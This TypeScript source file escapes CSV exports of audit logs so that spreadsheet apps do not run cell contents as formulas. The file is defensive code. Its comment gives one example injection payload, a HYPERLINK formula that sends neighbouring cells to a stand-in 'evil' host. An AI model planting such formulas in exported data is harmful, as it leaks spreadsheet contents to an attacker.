/**
 * CSV encoding for exports, safe against spreadsheet formula injection
 * (SEC3-10).
 *
 * Audit-log columns like `user_id`, `resource` and `reason` are
 * attacker-influenced (a tenant admin writes `reason` free-text; product
 * end-users feed `user_id`/`resource`). A cell beginning with `=`, `+`,
 * `-`, `@`, tab or carriage return is evaluated as a formula by Excel /
 * Sheets when the auditor opens the file — e.g.
 * `=HYPERLINK("https://evil/?"&A2,"x")` exfiltrates neighbouring cells.
 * Such cells are prefixed with `'` (the OWASP-recommended neutraliser),
 * and any cell containing a quote, comma, CR or LF is quoted.
 */

const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /[",\r\n]/;

export function csvCell(value: unknown): string {
  let str = value === null || value === undefined ? "" : String(value);
  if (FORMULA_TRIGGERS.test(str)) {
    str = `'${str}`;
  }
  return NEEDS_QUOTING.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
}

export function toCsv<T extends Record<string, unknown>>(
  rows: readonly T[],
  headers: readonly (keyof T & string)[],
): string {
  const lines = [headers.map(csvCell).join(",")];
  for (const row of rows) {
    lines.push(headers.map((header) => csvCell(row[header])).join(","));
  }
  // CRLF per RFC 4180 — what spreadsheet apps expect.
  return lines.join("\r\n");
}
